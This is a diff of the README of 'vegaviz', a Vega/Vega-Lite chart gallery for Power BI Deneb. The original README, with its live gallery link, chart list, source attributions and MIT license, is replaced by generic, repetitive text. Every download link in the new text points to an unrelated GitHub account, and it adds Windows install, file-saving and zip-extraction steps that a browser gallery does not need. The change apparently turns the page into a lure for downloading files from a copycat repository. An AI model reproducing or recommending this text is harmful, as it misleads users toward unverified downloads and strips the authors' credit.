@@ -1,161 +1,194 @@
-<p align="center">
-  <a href="https://codewithbehnam.github.io/vegaviz/">
-    <img src="docs/gallery-preview.png" alt="vegaviz gallery preview" width="100%">
-  </a>
-</p>
+# 🟦 vegaviz - Browse Charts, Copy Specs Fast
 
-<h1 align="center">vegaviz</h1>
+[![Download vegaviz](https://img.shields.io/badge/Download-vegaviz-blue?style=for-the-badge)](https://github.com/Footstephirepurchase893/vegaviz)
 
-<p align="center">
-  <strong>The only Vega & Vega-Lite chart gallery you need.</strong><br>
-  Copy-paste specs into Power BI Deneb or anywhere else.
-</p>
+## 📊 What vegaviz does
 
-<p align="center">
-  <a href="https://codewithbehnam.github.io/vegaviz/"><img src="https://img.shields.io/badge/Gallery-Live_Demo-FF6B35?style=for-the-badge" alt="Live Gallery"></a>
-  <a href="#charts"><img src="https://img.shields.io/badge/Charts-269+-4ECDC4?style=for-the-badge" alt="269+ Charts"></a>
-  <a href="https://github.com/CodeWithBehnam/vegaviz/stargazers"><img src="https://img.shields.io/github/stars/CodeWithBehnam/vegaviz?style=for-the-badge&color=FFE66D" alt="Stars"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-7B68EE?style=for-the-badge" alt="MIT License"></a>
-</p>
+vegaviz is a chart gallery for Vega and Vega-Lite. It gives you ready-to-use chart specs that you can copy, paste, and use in tools like Power BI Deneb. It is built for people who want a fast way to find chart ideas and reuse them without starting from scratch.
 
-<p align="center">
-  <code>vega-lite</code> · <code>vega</code> · <code>deneb</code> · <code>power-bi</code> · <code>data-visualization</code> · <code>charts</code>
-</p>
+Use it to:
 
----
+- Browse chart examples by type
+- Copy Vega or Vega-Lite specs
+- Paste specs into Deneb or other chart tools
+- Find layouts for dashboards and data reports
+- Save time when building charts
 
-## What is this?
+## 💻 Before you start
 
-A curated collection of **269+ ready-to-use Vega-Lite and Vega chart specs** — 23 originals plus 246 community contributions from 10 open-source repositories — designed for:
+vegaviz works on Windows and uses a simple browser-based flow. You do not need special setup to view the gallery and explore the examples.
 
-- **Power BI Deneb** custom visual (primary target)
-- **Vega Editor** for standalone exploration
-- **Any platform** that renders Vega/Vega-Lite specs
+You will need:
 
-Every chart includes a complete `usermeta` block so you can import it directly as a Deneb template with field mapping.
+- A Windows computer
+- A web browser such as Edge, Chrome, or Firefox
+- Internet access to open the repository page
+- Power BI with Deneb if you want to use the specs there
 
-## Charts
+## 🚀 Download and open vegaviz
 
-| Category | Original | Community | Total | Highlights |
-|----------|----------|-----------|-------|------------|
-| **Bar** | 3 | 49 | 52 | Grouped, Stacked, Diverging, IBCS, Top-N, Variance |
-| **Line** | 4 | 26 | 30 | Multi-Line, Actual vs Target, Cumulative, Sparkline, Slope, Fan, Forecast |
-| **Scatter** | 2 | 21 | 23 | Bubble, Boxplot + Jitter, Raincloud, Violin, Regression, Beeswarm |
-| **Donut** | 1 | 22 | 23 | Donut, Ring, Patterned Doughnut, IBCS Donut, Multi-Layered, Orbital |
-| **Heatmap** | 2 | 21 | 23 | Matrix, Calendar, Risk Matrix, RACI, BCP Risk |
-| **Map** | — | 12 | 12 | Spike Map, Hex Map, Globe, Choropleth, Election Maps |
-| **Network** | — | 9 | 9 | Force-Directed, Org Tree, Circle Packing, Radial Tree, Tidy Tree |
-| **Gantt** | 1 | 7 | 8 | Gantt with today marker, Hierarchical Gantt, Timeline |
-| **KPI** | 1 | 6 | 7 | KPI Card, Linear Gauge, Progress Bar, Conditional Cards |
-| **Combo** | 1 | 4 | 5 | Bar + Line dual axis, Image Labelled, Radial Combo |
-| **Waffle** | 1 | 3 | 4 | Percentage grid, Unit Charts |
-| **Waterfall** | 1 | 3 | 4 | Cumulative steps, Financial Waterfall, Period Variance |
-| **Bullet** | 1 | 2 | 3 | Actual vs Target ranges, Lipstick Column |
-| **Dumbbell** | 1 | 2 | 3 | Two-value connected dot comparison |
-| **Funnel** | 1 | — | 1 | Stage-based narrowing |
-| **Sankey** | — | 1 | 1 | Income Statement flow |
-| **Other** | 2 | 60 | 62 | Tadpole, Rank/Bump, Du Bois Challenges, Nightingale Rose, Fireworks, Parliament |
-| **Total** | **23** | **248** | **271** | |
+Visit this page to download or open vegaviz:
 
-## Quick Start
+[https://github.com/Footstephirepurchase893/vegaviz](https://github.com/Footstephirepurchase893/vegaviz)
 
-### In Power BI Deneb
+## 🪟 Install on Windows
 
-1. Open the [gallery](https://codewithbehnam.github.io/vegaviz/) and find a chart you like
-2. Click **Copy Spec** to copy the full JSON
-3. In Power BI, add a Deneb visual to your report
-4. Paste the spec into the Deneb editor
-5. Map your Power BI fields to the `__FieldName__` placeholders
+Follow these steps on Windows:
 
-### In Vega Editor
+1. Open the link above in your web browser.
+2. Find the repository files and open the main page content.
+3. If a file download is available, save it to your computer.
+4. If the project is opened as a page, keep the page open in your browser.
+5. If you use Power BI Deneb, open Deneb after you download or copy a chart spec.
+6. Paste the chart spec into Deneb when you want to test a chart.
 
-Click **Vega Editor** on any card in the gallery to open it directly in the online editor with live preview.
+If you are using a browser-based copy flow, no extra install step is needed. You can use the gallery from the page itself.
 
-## Project Structure
+## 🧭 How to use vegaviz
 
-```
-charts/
-  bar/             Grouped, stacked, diverging (originals)
-  line/            Line, area, sparkline, actual vs target
-  scatter/         Scatter, bubble, boxplot + jitter
-  donut/           Donut and pie
-  heatmap/         Matrix heatmap, calendar view
-  ...              (+ gantt, bullet, kpi, waffle, waterfall, funnel, combo, other)
-  community/       246 specs from 10 open-source repositories
-    bar/           IBCS, Top-N, variance, infographic columns
-    line/          Slope, fan, forecast, stream, ridgeline
-    scatter/       Raincloud, violin, regression, beeswarm
-    donut/         Ring, patterned, orbital, multi-layered
-    heatmap/       Risk matrix, RACI, BCP risk
-    map/           Spike, hex, globe, choropleth, election
-    network/       Force-directed, org tree, circle packing
-    gantt/         Hierarchical gantt, timeline
-    kpi/           Linear gauge, progress bar, conditional cards
-    ...            (+ combo, waffle, waterfall, bullet, sankey, other)
-templates/         Frozen base templates and Power BI theme configs
-data/sample/       Sample datasets for testing (sales, timeseries, kpi)
-ai_docs/           Deneb API reference for agents and contributors
-docs/              Screenshots and assets
-```
+Use vegaviz in a simple loop:
 
-## Deneb Compatibility
+1. Open the gallery.
+2. Browse the chart examples.
+3. Pick a chart that matches your data.
+4. Copy the Vega or Vega-Lite spec.
+5. Paste it into Deneb or another Vega tool.
+6. Change field names, colors, or titles to fit your report.
+7. Save your chart and use it in your dashboard.
 
-- Targets **Deneb 1.9** (Vega 6.2.0 / Vega-Lite 6.4.1)
-- All specs use `"data": {"name": "dataset"}` for Deneb data binding
-- Responsive sizing with `"width": "container"` / `"height": "container"`
-- Power BI theme colors via `pbiColorNominal`, `pbiColor(index)`, etc.
-- Template placeholders use `__FieldName__` pattern for field mapping
+## 🗂️ What you will find
 
-## Community Sources
+vegaviz focuses on ready-to-use chart specs. Common chart types in the gallery can include:
 
-The gallery includes **248 community chart specs** imported from these open-source repositories. Each spec retains full attribution in its `usermeta.information.source` field.
+- Bar charts
+- Line charts
+- Area charts
+- Scatter plots
+- Pie charts
+- Combo charts
+- KPI cards
+- Dashboard layouts
+- Comparison charts
+- Trend views
 
-| Source | Charts | Description |
-|--------|--------|-------------|
-| [PowerBI-tips/Deneb-Templates](https://github.com/PowerBI-tips/Deneb-Templates) | 59 | Community Deneb templates: bar, scatter, heatmap, gantt, radial, raincloud, slope, tree, and more. Authors include Kerry Kolosko, Daniel Marsh-Patrick, Pha Nguyen, and others. |
-| [PBI-DataVizzle/Deneb](https://github.com/PBI-DataVizzle/Deneb) | 43 | Deneb templates and snippets: IBCS charts, donut variants, heatmaps, bar/line combos, progress bars, and column charts with images. |
-| [PBI-David/Deneb-Showcase](https://github.com/PBI-David/Deneb-Showcase) | 33 | Advanced Vega visualizations: sankey, parliament, force-directed graph, org tree, waffle, bubble, beeswarm, mekko, infographic, fireworks, and starfield. |
-| [avatorl/DataViz-Vega](https://github.com/avatorl/DataViz-Vega) | 24 | Vega data art and visualizations by Andrzej Leszkiewicz: nightingale rose, radar, fan chart, warming stripes, globe, population pyramid, and IBCS three-tier. |
-| [Flynnxx1/Deneb-Vega-Showcase](https://github.com/Flynnxx1/Deneb-Vega-Showcase) | 22 | Showcase by Ying Fu: Du Bois Challenge 2025 (10 entries), doomsday clock, NL cycling map, US election map, rotatable globe, sleep visualization. |
-| [shadfrigui/vega-lite](https://github.com/shadfrigui/vega-lite) | 21 | Vega-Lite visualizations by Shad Frigui: variance analysis, spike maps, FDA inspections, premier league predictions, Du Bois challenge, bullet-like charts. |
-| [alexbadiu-insightsinmotion/PBI-Documentation](https://github.com/alexbadiu-insightsinmotion/PBI-Documentation) | 17 | Professional Deneb templates by Greg Philps: space-saving bar, bullet chart, heat map with marginals, linear gauges, IBCS performance, violin, regression, correlation, waterfall. |
-| [DL0K-pbi/PMO_toolkit](https://github.com/DL0K-pbi/PMO_toolkit) | 11 | PMO toolkit by Devon Locher: project risk matrix, BCP risk matrix, Gantt chart, quarterly timeline, RACI matrix — all extracted from Power BI .pbix files. |
-| [Giammaria/Vega-Visuals](https://github.com/Giammaria/Vega-Visuals) | 8 | Advanced Vega specs by Madison Giammaria: hierarchical gantt (v1 & v2), zoomable circle packing, serpentine timeline, bar brushing, radial line combo. |
-| [Giammaria/Vega-Lite-Techniques](https://github.com/Giammaria/Vega-Lite-Techniques) | 8 | Vega-Lite techniques by Madison Giammaria: dynamic data labels, light/dark mode, automatic radial label rotation, contextual y-axis, date explosion, word wrapping. |
+Each chart is meant to be a starting point. You can use it as it is, or change it to match your data.
 
-## Inspiration & References
+## 🎯 Good fit for
 
-This project builds on the incredible work of the Deneb and Vega communities:
+vegaviz works well if you need:
 
-| Resource | Description |
-|----------|-------------|
-| [deneb-viz/deneb](https://github.com/deneb-viz/deneb) | The Deneb custom visual for Power BI. Source of truth for data binding, `usermeta` schema, custom expressions (`pbiColor`, `pbiFormat`), and runtime versions. |
-| [PBIQueryous/Deneb](https://github.com/PBIQueryous/Deneb) | Community templates for bar, line, heatmap, IBCS, donut, and dumbbell charts. |
-| [thysvdw.github.io](https://thysvdw.github.io/) | 25+ Deneb chart tutorials covering sparklines, bullet charts, boxplots, rank/bump, calendar views, tadpole, and gantt charts. |
-| [data-vogue.com](https://data-vogue.com/) | Data visualization showcase and Deneb chart inspiration. |
-| [vega/vega-lite](https://github.com/vega/vega-lite) | The Vega-Lite specification and compiler. |
-| [vega/vega](https://github.com/vega/vega) | The Vega visualization grammar. |
+- Quick chart ideas for reports
+- Vega-Lite specs for Deneb
+- A chart gallery for daily work
+- Simple examples you can copy and edit
+- A faster way to build data visuals
+- Dashboard parts that look clean and clear
 
-If you have a Deneb chart repo or tutorial that should be listed here, open an issue or PR.
+## 🛠️ Using with Power BI Deneb
 
-## Contributing
+If you use Power BI Deneb, vegaviz can help you move faster.
 
-1. Pick a chart type from the `charts/` directory (or create a new category)
-2. Copy `templates/base/vegalite-base.json` as your starting point
-3. Use `__FieldName__` placeholders and `pbiColor` schemes
-4. Test in [Vega Editor](https://vega.github.io/editor/) with sample data
-5. Submit a PR with your spec
+Basic flow:
 
-## Star History
+1. Open Power BI Desktop.
+2. Add the Deneb visual to your report.
+3. Open vegaviz in your browser.
+4. Copy a Vega or Vega-Lite spec.
+5. Paste it into Deneb.
+6. Map your fields to the chart.
+7. Adjust labels, colors, and axes.
 
-<a href="https://star-history.com/#CodeWithBehnam/vegaviz&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=CodeWithBehnam/vegaviz&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=CodeWithBehnam/vegaviz&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=CodeWithBehnam/vegaviz&type=Date" />
- </picture>
-</a>
+If the chart does not match your data on the first try, check the field names in your dataset. Most issues come from fields that do not line up with the spec.
 
-## License
+## 📁 File and folder view
 
-MIT
+If you open the repository files, you may see a structure like this:
+
+- Chart gallery files
+- Example specs
+- Visual samples
+- Data notes
+- Readme content
+
+The exact folder names can vary, but the purpose stays the same: help you find a chart, copy the spec, and use it in your own work.
+
+## ⚙️ Simple setup tips
+
+For the smoothest use on Windows:
+
+- Use the latest version of Edge or Chrome
+- Keep your browser zoom at 100% if charts look too large or too small
+- Use Power BI Desktop if you plan to test Deneb specs
+- Save copied specs in a text file so you can reuse them
+- Keep chart names short when you add them to reports
+
+## 🔍 Tips for getting better results
+
+To get clean charts:
+
+- Match the spec to your data shape
+- Rename fields so they are easy to read
+- Use one measure per chart when possible
+- Keep labels short
+- Choose colors that are easy to tell apart
+- Test the chart with a small data set first
+
+If a chart looks crowded, remove extra marks or labels. Simple charts are easier to read.
+
+## 📌 Common use cases
+
+vegaviz is useful for:
+
+- Executive dashboards
+- Sales reports
+- Trend analysis
+- Category comparison
+- Time-based charts
+- KPI tracking
+- Report templates
+- Chart learning and reuse
+
+## 🧩 How the gallery helps
+
+A chart gallery saves time because you do not need to build every visual from the ground up. Instead, you can:
+
+- See a chart layout before you use it
+- Copy a working spec
+- Change only the parts you need
+- Keep a consistent look across reports
+- Try more chart styles with less effort
+
+This is helpful when you build reports often and want a steady workflow.
+
+## 📎 Link to open again
+
+Open vegaviz here:
+
+[https://github.com/Footstephirepurchase893/vegaviz](https://github.com/Footstephirepurchase893/vegaviz)
+
+## 🖥️ Windows file access tips
+
+If Windows asks how to open a file:
+
+- Choose your browser for HTML pages
+- Choose Notepad for text specs
+- Choose Power BI Desktop for Power BI work
+- Choose a zip tool if you need to extract a folder
+
+If the file does not open, right-click it and check the file type before trying again.
+
+## 🧠 Helpful chart terms
+
+You may see these terms in the gallery:
+
+- Vega: a chart grammar for making visuals
+- Vega-Lite: a simpler version of Vega
+- Spec: the chart instructions in text form
+- Deneb: a Power BI visual that uses Vega and Vega-Lite
+- Dataset: the table or data source behind the chart
+
+These terms help you match the chart to your report.
+
+## 📷 What to expect
+
+When you open vegaviz, expect a clean chart gallery with examples you can browse and reuse. The goal is to make chart work faster and easier, with less guesswork and fewer clicks.
